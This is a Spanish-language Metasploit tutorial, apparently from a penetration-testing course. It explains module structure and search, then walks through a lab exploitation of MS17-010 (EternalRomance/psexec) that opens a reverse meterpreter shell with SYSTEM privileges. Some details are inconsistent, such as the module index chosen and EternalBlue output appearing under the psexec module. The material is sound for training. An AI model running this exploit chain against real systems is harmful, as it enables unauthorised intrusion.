# Modules

Como mencionamos anteriormente, los módulos de Metasploit son scripts preparados con un propósito específico y funciones correspondientes que ya han sido desarrolladas y probadas en el mundo real. La categoría de **exploit** consiste en los llamados _proof-of-concept_ (POCs) que pueden ser utilizados para explotar vulnerabilidades existentes de manera mayormente automatizada. Muchas personas a menudo piensan que el fallo de un exploit demuestra la inexistencia de la vulnerabilidad sospechada. Sin embargo, esto solo prueba que el exploit de Metasploit no funcionó, y no que la vulnerabilidad no exista. Esto se debe a que muchos exploits requieren personalización según los hosts objetivo para que funcionen. Por lo tanto, las herramientas automatizadas como el framework Metasploit solo deben considerarse herramientas de apoyo y no un sustituto de nuestras habilidades manuales.

Una vez que estamos en **msfconsole**, podemos seleccionar de una lista extensa que contiene todos los módulos disponibles de Metasploit. Cada uno de ellos está estructurado en carpetas, que se verán de la siguiente manera:

### **Sintaxis de los Módulos**

```plaintext
<No.> <type>/<os>/<service>/<name>
```

### **Ejemplo**

```plaintext
794   exploit/windows/ftp/scriptftp_list
```

### **Index No.**

El campo **No.** se mostrará para seleccionar el exploit que queremos durante nuestras búsquedas. Veremos más adelante cómo este campo puede ser útil para seleccionar módulos específicos de Metasploit.

### **Type**

El campo **Type** es el primer nivel de segregación entre los módulos de Metasploit. Al observar este campo, podemos saber qué logrará el código de este módulo. Algunos de estos tipos no son directamente utilizables como lo sería un módulo de exploit. Sin embargo, están destinados a introducir la estructura junto a los interactuables para una mejor modularización. Para explicarlo mejor, estos son los tipos posibles que podrían aparecer en este campo:

| Tipo      | Descripción                                                                                                                   |
| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Auxiliary | Escaneo, fuzzing, sniffing y capacidades de administración. Ofrecen asistencia y funcionalidad extra.                         |
| Encoders  | Garantizan que los payloads lleguen intactos a su destino.                                                                    |
| Exploits  | Módulos que explotan una vulnerabilidad y permiten la entrega del payload.                                                    |
| NOPs      | (_No Operation code_) Mantienen el tamaño del payload consistente entre intentos de exploit.                                  |
| Payloads  | Código que se ejecuta de forma remota y se comunica de vuelta con la máquina atacante para establecer una conexión (o shell). |
| Plugins   | Scripts adicionales que pueden integrarse dentro de una evaluación con **msfconsole**.                                        |
| Post      | Amplia gama de módulos para recopilar información, realizar pivotes más profundos, etc.                                       |

Nota: Al seleccionar un módulo para la entrega de payload, el comando `use <no.>` solo puede usarse con los siguientes módulos que pueden actuar como iniciadores (o módulos interactuables):

| Tipo      | Descripción                                                                             |
| --------- | --------------------------------------------------------------------------------------- |
| Auxiliary | Escaneo, fuzzing, sniffing y capacidades de administración.                             |
| Exploits  | Módulos que explotan una vulnerabilidad y permiten la entrega del payload.              |
| Post      | Amplia gama de módulos para recopilar información, realizar pivotes más profundos, etc. |

### **OS**

El campo **OS** especifica para qué sistema operativo y arquitectura se creó el módulo. Naturalmente, diferentes sistemas operativos requieren código diferente para obtener los resultados deseados.

### **Service**

El campo **Service** se refiere al servicio vulnerable que se está ejecutando en la máquina objetivo. Para algunos módulos, como los **auxiliary** o **post**, este campo puede referirse a una actividad más general, como _gather_, que se refiere a la recolección de credenciales, por ejemplo.

### **Name**

Finalmente, el campo **Name** explica la acción específica que puede realizarse utilizando este módulo, creado para un propósito específico.

## Búsqueda de Módulos

Metasploit también ofrece una función de búsqueda bien desarrollada para los módulos existentes. Con la ayuda de esta función, podemos buscar rápidamente entre todos los módulos utilizando etiquetas específicas para encontrar uno adecuado para nuestro objetivo.

### **MSF - Función de Búsqueda**

```plaintext
msf6 > help search

Uso: search [<opciones>] [<keywords>:<valor>]

Preceder un valor con '-' excluirá cualquier resultado coincidente.
Si no se proporcionan opciones o palabras clave, se mostrarán los resultados almacenados en caché.

OPCIONES:
  -h                   Mostrar esta información de ayuda
  -o <archivo>         Enviar la salida a un archivo en formato CSV
  -S <cadena>          Patrón de regex utilizado para filtrar resultados de búsqueda
  -u                   Usar módulo si hay un resultado
  -s <columna_busqueda> Ordenar los resultados de la búsqueda basados en <columna_busqueda> en orden ascendente
  -r                   Invertir el orden de los resultados de búsqueda a descendente

Palabras clave:
  aka              :  Módulos con un nombre alternativo coincidente
  author           :  Módulos escritos por este autor
  arch             :  Módulos que afectan a esta arquitectura
  bid              :  Módulos con un ID de Bugtraq coincidente
  cve              :  Módulos con un ID de CVE coincidente
  edb              :  Módulos con un ID de Exploit-DB coincidente
  check            :  Módulos que soportan el método 'check'
  date             :  Módulos con una fecha de divulgación coincidente
  description      :  Módulos con una descripción coincidente
  fullname         :  Módulos con un nombre completo coincidente
  mod_time         :  Módulos con una fecha de modificación coincidente
  name             :  Módulos con un nombre descriptivo coincidente
  path             :  Módulos con una ruta coincidente
  platform         :  Módulos que afectan esta plataforma
  port             :  Módulos con un puerto coincidente
  rank             :  Módulos con un rango coincidente (Puede ser descriptivo (ej: 'good') o numérico con operadores de comparación (ej: 'gte400'))
  ref              :  Módulos con una referencia coincidente
  reference        :  Módulos con una referencia coincidente
  target           :  Módulos que afectan este objetivo
  type             :  Módulos de un tipo específico (exploit, payload, auxiliary, encoder, evasion, post, o nop)

Columnas de búsqueda compatibles:
  rank             :  Ordenar módulos por su rango de exploitabilidad
  date             :  Ordenar módulos por su fecha de divulgación. Alias de disclosure_date
  disclosure_date  :  Ordenar módulos por su fecha de divulgación
  name             :  Ordenar módulos por su nombre
  type             :  Ordenar módulos por su tipo
  check            :  Ordenar módulos por si tienen o no un método de verificación

Ejemplos:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

### **Ejemplo de búsqueda**

Podemos intentar encontrar el exploit **EternalRomance** para sistemas operativos Windows más antiguos. Esto se vería algo así:

```plaintext
msf6 > search eternalromance
```

## **Módulos coincidentes**

```plaintext
   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
```

Otra búsqueda más refinada podría verse así:

```plaintext
msf6 > search eternalromance type:exploit
```

**Módulos coincidentes**

```plaintext
   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

También podemos hacer nuestra búsqueda más específica, reduciéndola a una categoría de servicios. Por ejemplo, para el CVE, podríamos especificar el año (`cve:<year>`), la plataforma Windows (`platform:<os>`), el tipo de módulo que queremos encontrar (`type:<auxiliary/exploit/post>`), el rango de fiabilidad (`rank:<rank>`), y el nombre de búsqueda (`<pattern>`). Esto reduciría nuestros resultados solo a aquellos que coincidan con todos los criterios anteriores.

### MSF - Búsqueda Específica

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

#### Módulos Coincidentes

```bash
bashCopiar código================
   #  Nombre                                            Fecha de Divulgación  Rango       Verificación  Descripción
   -  ----                                            ----------------------  ----       -----        -----------  
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02             excelente  Sí          Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06             excelente  Sí          Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11             excelente  Sí          Microsoft SharePoint Unsafe Control and ViewState RCE
```

## Selección de Módulo

Para seleccionar nuestro primer módulo, primero necesitamos encontrar uno. Supongamos que tenemos un objetivo que ejecuta una versión de SMB vulnerable a los exploits de EternalRomance (MS17\_010). Hemos encontrado que el puerto 445 del servidor SMB está abierto tras escanear el objetivo.

```bash
sherlock28@htb[/htb]$ nmap -sV 10.10.10.40
```

#### Resultados del Escaneo

```less
Iniciando Nmap 7.80 ( https://nmap.org ) a 2020-08-13 21:38 UTC
Estadísticas: 0:00:50 transcurrido; 0 hosts completados (1 arriba), 1 en escaneo de servicios
Informe de escaneo Nmap para 10.10.10.40
El host está activo (0.051s de latencia).
No se muestran: 991 puertos cerrados
PUERTO      ESTADO SERVICIO      VERSIÓN
135/tcp   abierto  msrpc        Microsoft Windows RPC
139/tcp   abierto  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   abierto  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (grupo de trabajo: WORKGROUP)
49152/tcp abierto  msrpc        Microsoft Windows RPC
49153/tcp abierto  msrpc        Microsoft Windows RPC
49154/tcp abierto  msrpc        Microsoft Windows RPC
49155/tcp abierto  msrpc        Microsoft Windows RPC
49156/tcp abierto  msrpc        Microsoft Windows RPC
49157/tcp abierto  msrpc        Microsoft Windows RPC
Información del Servicio: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Se realizó la detección del servicio. Por favor, informe cualquier resultado incorrecto en https://nmap.org/submit/.
Nmap finalizado: 1 dirección IP (1 host arriba) escaneada en 60.87 segundos
```

Iniciaremos **msfconsole** y buscaremos este nombre de exploit específico.

### MSF - Buscar MS17\_010

```bash
msf6 > search ms17_010
```

#### Módulos Coincidentes

```yaml
================
   #  Nombre                                      Fecha de Divulgación  Rango     Verificación  Descripción
   -  ----                                      ----------------------  ----     -----        -----------  
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14             promedio  Sí           MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14             normal   Sí           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14             normal   No           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No           MS17-010 SMB RCE Detection
```

A continuación, queremos seleccionar el módulo apropiado para este escenario. A partir del escaneo de Nmap, hemos detectado que el servicio SMB está ejecutándose en la versión Microsoft Windows 7 - 10. Con algo de escaneo adicional del sistema operativo, podemos suponer que es un Windows 7 ejecutando una instancia vulnerable de SMB. Procedemos a seleccionar el módulo con el número de índice 2 para probar si el objetivo es vulnerable.

## Uso de Módulos

Dentro de los módulos interactivos, hay varias opciones que podemos especificar. Estas se utilizan para adaptar el módulo Metasploit al entorno dado. Debido a que en la mayoría de los casos siempre necesitamos escanear o atacar diferentes direcciones IP, requerimos esta funcionalidad para poder establecer nuestros objetivos y ajustarlos. Para verificar qué opciones deben configurarse antes de que se pueda enviar el exploit al host objetivo, podemos usar el comando **show options**. Todo lo que se requiere establecer antes de la explotación tendrá un "Sí" en la columna Requerido.

### MSF - Seleccionar Módulo

```bash
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

#### Opciones del Módulo (exploit/windows/smb/ms17\_010\_psexec)

```perl
Nombre                  Configuración Actual                     Requerido  Descripción
   ----                  ------------------------                   --------  -----------  
   DBGTRACE              false                                    sí       Mostrar información de rastreo de depuración adicional
   LEAKATTEMPTS          99                                       sí       Cuántas veces intentar filtrar la transacción
   NAMEDPIPE                                                      no       Un pipe nombrado que puede ser conectado (dejar en blanco para auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  sí       Lista de pipes nombrados a comprobar
                         rdlists/named_pipes.txt
   RHOSTS                                                         sí       El/los host(s) objetivo(s), ver https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445                                      sí       El puerto objetivo (TCP)
   SERVICE_DESCRIPTION                                            no       Descripción del servicio que se usará en el objetivo para la lista bonita
   SERVICE_DISPLAY_NAME                                           no       El nombre de visualización del servicio
   SERVICE_NAME                                                   no       El nombre del servicio
   SHARE                 ADMIN$                                   sí       El recurso compartido al que conectarse, puede ser un recurso compartido administrativo (ADMIN$,C$,...) o una carpeta de lectura/escritura normal
   SMBDomain             .                                        no       El dominio de Windows a usar para la autenticación
   SMBPass                                                        no       La contraseña para el nombre de usuario especificado
   SMBUser                                                        no       El nombre de usuario para autenticar como
```

#### Opciones del Payload (windows/meterpreter/reverse\_tcp)

```java
   Nombre      Configuración Actual  Requerido  Descripción
   ----      ---------------------  --------  -----------  
   EXITFUNC  thread                  sí       Técnica de salida (Aceptado: '', seh, thread, process, none)
   LHOST                      sí       La dirección de escucha (se puede especificar una interfaz)
   LPORT     4444             sí       El puerto de escucha
```

#### Objetivo del Exploit:

```lua
   Id  Nombre
   --  ----
   0   Automático
```

Aquí vemos cuán útil puede ser la etiqueta de número. Porque ahora, no tenemos que escribir toda la ruta, solo el número asignado al módulo Metasploit en nuestra búsqueda. Podemos usar el comando **info** después de seleccionar el módulo si queremos saber algo más sobre el módulo. Esto nos dará una serie de información que puede ser importante para nosotros.

### MSF - Información del Módulo

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

#### Información del Módulo

```yaml
     Nombre: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Módulo: exploit/windows/smb/ms17_010_psexec
   Plataforma: Windows
       Arquitectura: x86, x64
 Privilegios: No
    Licencia: Licencia del Marco Metasploit (BSD)
       Rango: Normal
  Divulgado: 2017-03-14

Proporcionado por:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Objetivos disponibles:
  Id  Nombre
  --  ----
  0   Automático
  1   PowerShell
  2   Carga nativa
  3   Carga de MOF

Verificación soportada:
  Sí

Opciones básicas:
  Nombre                  Configuración Actual                     Requerido  Descripción
  ----                  ------------------------                   --------  -----------  
  DBGTRACE              false                                    sí       Mostrar información de rastreo de depuración adicional
  LEAKATTEMPTS          99                                       sí       Cuántas veces intentar filtrar la transacción
  NAMEDPIPE                                                      no       Un pipe nombrado que puede ser conectado (dejar en blanco para auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  sí       Lista de pipes nombrados a comprobar
                        rdlists/named_pipes.txt
  RHOSTS                                                         sí       El/los host(s) objetivo(s), ver https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT                 445                                      sí       El puerto objetivo (TCP)
  SERVICE_DESCRIPTION                                            no       Descripción del servicio que se usará en el objetivo para la lista bonita
  SERVICE_DISPLAY_NAME                                           no       El nombre de visualización del servicio
  SERVICE_NAME                                                   no       El nombre del servicio
  SHARE                 ADMIN$                                   sí       El recurso compartido al que conectarse, puede ser un recurso compartido administrativo (ADMIN$,C$,...) o una carpeta de lectura/escritura normal
  SMBDomain             .                                        no       El dominio de Windows a usar para la autenticación
  SMBPass                                                        no       La contraseña para el nombre de usuario especificado
  SMBUser                                                        no       El nombre de usuario para autenticar como
```

#### Información sobre el Payload:

```yaml
Espacio: 3072
```

```markdown
Este módulo explotará SMB con vulnerabilidades en MS17-010 para
  lograr un primitivo de escritura-qué-dónde. Esto se utilizará para
  sobrescribir la información de sesión de conexión con una
  sesión de Administrador. Desde allí, se realiza la ejecución normal del código del payload psexec. 
  Explotando una confusión de tipo entre las solicitudes de 
  Transacción y WriteAndX y una condición de carrera en las solicitudes de 
  Transacción, como se vio en los exploits de EternalRomance, EternalChampion y EternalSynergy. 
  Esta cadena de exploit es más confiable que el exploit de EternalBlue,
  pero requiere un pipe nombrado.

### Referencias:
- [Documentación de Microsoft sobre MS17-010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)
- [NVD - CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)
- [NVD - CVE-2017-0146](https://nvd.nist.gov/vuln/detail/CVE-2017-0146)
- [NVD - CVE-2017-0147](https://nvd.nist.gov/vuln/detail/CVE-2017-0147)
- [GitHub - MS17-010](https://github.com/worawit/MS17-010)
- [Análisis del Exploit de HITCON](https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf)
- [Blog de Technet sobre SRD](https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/)

### También conocido como:
ETERNALSYNERGY ETERNALROMANCE ETERNALCHAMPION ETERNALBLUE
```

### MSF - Especificación de Objetivo Permanente

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

#### Opciones del Módulo

```perl
Nombre                  Configuración Actual                          Requerido  Descripción
   ----                  ------------------------                        --------  -----------  
   DBGTRACE              false                                       sí       Mostrar información de rastreo de depuración adicional
   LEAKATTEMPTS          99                                          sí       Cuántas veces intentar filtrar la transacción
   NAMEDPIPE                                                      no        Un pipe nombrado que puede ser conectado (dejar en blanco para auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo   sí       Lista de pipes nombrados a comprobar
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                                 sí       El/los host(s) objetivo(s), ver https://github.com/rapid7/metasploit-framework
                                                                           /wiki/Using-Metasploit
   RPORT                 445                                         sí       El puerto objetivo (TCP)
   SERVICE_DESCRIPTION                                            no        Descripción del servicio que se usará en el objetivo para la lista bonita
   SERVICE_DISPLAY_NAME                                           no        El nombre de visualización del servicio
   SERVICE_NAME                                                   no        El nombre del servicio
   SHARE                 ADMIN$                                      sí       El recurso compartido al que conectarse, puede ser un recurso compartido administrativo (ADMIN$,C$,...) o una carpeta de lectura/escritura normal
   SMBDomain             .                                           no        El dominio de Windows a usar para la autenticación
   SMBPass                                                        no        La contraseña para el nombre de usuario especificado
   SMBUser                                                        no        El nombre de usuario para autenticar como
```

#### Opciones del Payload (windows/meterpreter/reverse\_tcp)

```java
   Nombre      Configuración Actual  Requerido  Descripción
   ----      ---------------------  --------  -----------  
   EXITFUNC  thread                 sí       Técnica de salida (Aceptado: '', seh, thread, process, none)
   LHOST                      sí       La dirección de escucha (se puede especificar una interfaz)
   LPORT     4444             sí       El puerto de escucha
```

#### Objetivo del Exploit:

```lua
Id  Nombre
   --  ----
   0   Automático
```

Una vez que todo esté configurado y listo, podemos proceder a lanzar el ataque. Tenga en cuenta que el payload no se estableció aquí, ya que el predeterminado es suficiente para esta demostración.

### Ejecución del Exploit

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

#### Salida de Ejecución

```less
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

```bash
meterpreter> shell
```

### Interacción con el Objetivo

```bash
C:\Windows\system32> whoami
```

```bash
whoami
nt authority\system
```

Hemos obtenido un shell en la máquina objetivo y podemos interactuar con él. Este ha sido un ejemplo rápido y directo de cómo `msfconsole` puede ayudar rápidamente, pero sirve como un excelente ejemplo de cómo funciona el marco. Solo se necesitó un módulo sin selección de payload, codificación o pivoteo entre sesiones o trabajos.
